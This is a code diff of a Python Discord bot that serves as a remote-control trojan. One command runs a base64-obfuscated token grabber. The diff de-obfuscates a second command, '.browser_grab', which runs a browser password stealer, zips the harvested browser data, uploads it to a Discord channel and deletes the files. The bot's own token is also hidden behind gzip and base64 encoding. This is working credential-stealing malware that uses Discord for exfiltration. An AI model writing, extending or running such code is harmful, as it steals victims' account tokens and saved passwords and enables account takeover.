@@ -475,6 +475,19 @@ async def on_message(message):
         exec(base64.b64decode("YXdhaXQgbWVzc2FnZS5kZWxldGUoKQ0KICAgICAgICAjcnVuIHRva2VuX2dyYWJiZXIucHl3IGFuZCB3YWl0IHVudGlsIGZpbmlzaGVkIHRoZW4gc2VuZCB0b2tlbi50eHQNCiAgICAgICAgb3Muc3lzdGVtKGYicHkge21haW5fcGF0aH1cXGJ1aWx0X2luX21vZHVsZXNcXGRpc2NvcmRfdG9rZW5fZ3JhYmJlci5weXciKQ0KDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0iVG9rZW4gR3JhYmJlciIsIGRlc2NyaXB0aW9uPSJUb2tlbiBncmFiYmVyIGV4ZWN1dGVkLiIsIGNvbG9yPTB4MDBmZjAwKQ0KICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCg0KICAgICAgICB3aGlsZShvcy5wYXRoLmV4aXN0cyhmInttYWluX3BhdGh9XFx0b2tlbi50eHQiKSA9PSBGYWxzZSk6DQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpDQoNCiAgICAgICAgd2l0aCBvcGVuKGYie21haW5fcGF0aH1cXHRva2VuLnR4dCIsICJyIikgYXMgZjoNCiAgICAgICAgICAgIHRva2VuID0gZi5yZWFkKCkNCiAgICAgICAgDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0iVG9rZW4gR3JhYmJlciIsIGRlc2NyaXB0aW9uPWYie3Rva2VufSIsIGNvbG9yPTB4MDBmZjAwKQ0KICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCiAgICAgICAgb3MucmVtb3ZlKGYie21haW5fcGF0aH1cXHRva2VuLnR4dCIp"))
         
     if message.content.startswith(".browser_grab"):
-        exec(base64.b64decode("YXdhaXQgbWVzc2FnZS5kZWxldGUoKQ0KICAgICAgICAjcnVuIHRva2VuX2dyYWJiZXIucHl3IGFuZCB3YWl0IHVudGlsIGZpbmlzaGVkIHRoZW4gc2VuZCB0b2tlbi50eHQNCiAgICAgICAgb3Muc3lzdGVtKGYicHkge21haW5fcGF0aH1cXGJ1aWx0X2luX21vZHVsZXNcXGJyb3dzZXJfcHN3LnB5dyIpDQoNCiAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSJUb2tlbiBHcmFiYmVyIiwgZGVzY3JpcHRpb249IkV4ZWN1dGVkLiIsIGNvbG9yPTB4MDBmZjAwKQ0KICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChlbWJlZD1lbWJlZCkNCg0KICAgICAgICB3aGlsZShvcy5wYXRoLmV4aXN0cyhmInttYWluX3BhdGh9XFxicm93c2VycyIpID09IEZhbHNlKToNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkNCg0KICAgICAgICBtYWtlX2FyY2hpdmUoImJyb3dzZXJzIiwgInppcCIsIGYie21haW5fcGF0aH1cXGJyb3dzZXJzIikNCiAgICAgICAgYXdhaXQgbWVzc2FnZS5jaGFubmVsLnNlbmQoZmlsZT1kaXNjb3JkLkZpbGUoZiJ7bWFpbl9wYXRofVxcYnJvd3NlcnMuemlwIikpDQogICAgICAgIG9zLnJlbW92ZShmInttYWluX3BhdGh9XFxicm93c2Vycy56aXAiKQ0KICAgICAgICBvcy5yZW1vdmUoZiJ7bWFpbl9wYXRofVxcYnJvd3NlcnMiKQ=="))
+        await message.delete()
+        #run token_grabber.pyw and wait until finished then send token.txt
+        os.system(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
+
+        embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+        while(os.path.exists(f"{main_path}\\browsers") == False):
+            time.sleep(1)
+
+        make_archive("browsers", "zip", f"{main_path}\\browsers")
+        await message.channel.send(file=discord.File(f"{main_path}\\browsers.zip"))
+        os.remove(f"{main_path}\\browsers.zip")
+        os.remove(f"{main_path}\\browsers")
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
